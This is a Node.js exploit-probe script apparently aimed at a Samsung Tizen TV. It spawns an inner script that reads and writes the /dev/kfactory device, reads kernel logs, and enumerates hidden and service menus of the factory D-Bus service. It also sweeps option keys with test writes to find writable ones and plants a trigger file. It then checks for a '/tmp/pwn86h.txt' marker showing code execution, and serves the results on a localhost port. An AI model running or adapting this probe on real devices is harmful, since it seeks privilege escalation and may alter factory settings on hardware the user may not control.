'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8175;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe86h.txt';
var PWN = '/tmp/pwn86h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. Read /dev/kfactory (world r/w char device!)
  'try {',
  '  var kfd = fs.openSync("/dev/kfactory", "r");',
  '  var kbuf = Buffer.allocUnsafe(256);',
  '  var kn = fs.readSync(kfd, kbuf, 0, 256, 0);',
  '  fs.closeSync(kfd);',
  '  r.dev_kfactory_read = kbuf.slice(0,kn).toString("hex");',
  '  r.dev_kfactory_ascii = kbuf.slice(0,kn).toString("utf8").replace(/[^\\x20-\\x7e]/g,".");',
  '} catch(e) { r.dev_kfactory_read_err = e.message; }',

  // 2. Read dmesg/kmsg for kfactoryd log entries (shows what Executes ran!)
  'try {',
  '  var o_dmesg = cp.spawnSync("/bin/sh",["-c","dmesg 2>&1 | tail -100"],{timeout:5000});',
  '  var dmesg_out = (o_dmesg.stdout||Buffer.from("")).toString();',
  '  r.dmesg_kfac = dmesg_out.split("\\n").filter(function(l){ return l.indexOf("factory")>-1||l.indexOf("kfac")>-1||l.indexOf("execl")>-1||l.indexOf("string")>-1; }).join("\\n").slice(0,2000);',
  '  r.dmesg_tail = dmesg_out.slice(-1000);',
  '} catch(e) { r.dmesg_err = e.message; }',

  // 3. Read /proc/kmsg directly (may require permission)
  'try {',
  '  var km = fs.readFileSync("/proc/kmsg","utf8").slice(0,1000);',
  '  r.kmsg = km;',
  '} catch(e) { r.kmsg_err = e.code; }',

  // 4. GetChildItem for Debug(3), SVC(4), Hidden(5) menus
  'r.child_items = {};',
  'var parent_keys = [2,3,4,5];',
  'parent_keys.forEach(function(pk) {',
  '  r.child_items["p"+pk] = [];',
  '  for (var idx = 0; idx < 15; idx++) {',
  '    try {',
  '      var o = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetChildItem",String(pk),String(idx)],{timeout:4000});',
  '      var out = (o.stdout||Buffer.from("")).toString().trim();',
  '      if (out && out.indexOf("(1,)") === -1) {',
  '        r.child_items["p"+pk].push({ idx:idx, data:out.slice(0,150) });',
  '      } else { break; }',
  '    } catch(e) { break; }',
  '  }',
  '});',

  // 5. GetParentItem for key 12
  'try {',
  '  var o_par = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetParentItem","12"],{timeout:5000});',
  '  r.parent_k12 = (o_par.stdout||Buffer.from("")).toString().trim().slice(0,200);',
  '} catch(e) { r.parent_k12_err = e.message; }',

  // 6. GetItem for keys 6..20
  'r.items_6_20 = {};',
  'for (var gk = 6; gk <= 20; gk++) {',
  '  try {',
  '    var o_gi = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetItem",String(gk)],{timeout:4000});',
  '    var gout = (o_gi.stdout||Buffer.from("")).toString().trim();',
  '    if (gout && gout.indexOf("(1,)") === -1) r.items_6_20["k"+gk] = gout.slice(0,150);',
  '  } catch(e) {}',
  '}',

  // 7. Sweep SetOptionStringData for keys 10..50 (find writable ones)
  'r.opt_writeable = [];',
  'for (var ok = 10; ok <= 50; ok++) {',
  '  try {',
  '    var o_so = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData",String(ok),"test","4"],{timeout:3000});',
  '    var soout = (o_so.stdout||Buffer.from("")).toString().trim();',
  '    if (soout && soout.indexOf("(-4,)") === -1 && soout.indexOf("(1,)") === -1) r.opt_writeable.push({ key:ok, ret:soout.slice(0,50) });',
  '  } catch(e) {}',
  '}',

  // 8. Write to /dev/kfactory - try a small payload
  'try {',
  '  var kfd2 = fs.openSync("/dev/kfactory", "w");',
  '  var written = fs.writeSync(kfd2, Buffer.from([0x01, 0x00, 0x00, 0x00]));',
  '  fs.closeSync(kfd2);',
  '  r.dev_kfactory_write = { written: written };',
  '  // Check if pwn appeared after write',
  '  try { r.pwn_kfac = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) {}',
  '} catch(e) { r.dev_kfactory_write_err = e.message; }',

  // 9. Create /tmp/factory-ready (kfactoryd might check for it)
  'try {',
  '  fs.writeFileSync("/tmp/factory-ready", "1");',
  '  r.factory_ready_created = true;',
  '} catch(e) { r.factory_ready_err = e.message; }',

  // 10. GetFString for wider range (10..30)
  'r.fstring_wide = {};',
  'for (var ft = 10; ft <= 20; ft++) {',
  '  try {',
  '    var o_fs = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetFString",String(ft)],{timeout:3000});',
  '    var fsout = (o_fs.stdout||Buffer.from("")).toString().trim();',
  '    if (fsout && fsout.indexOf("(1,)") === -1) r.fstring_wide["ft"+ft] = fsout.slice(0,100);',
  '  } catch(e) {}',
  '}',

  // 11. Final pwn check
  'try { r.pwn_final = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) { r.pwn_final_err = e.code; }',

  'var out = JSON.stringify(r,null,2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '",out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 150000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
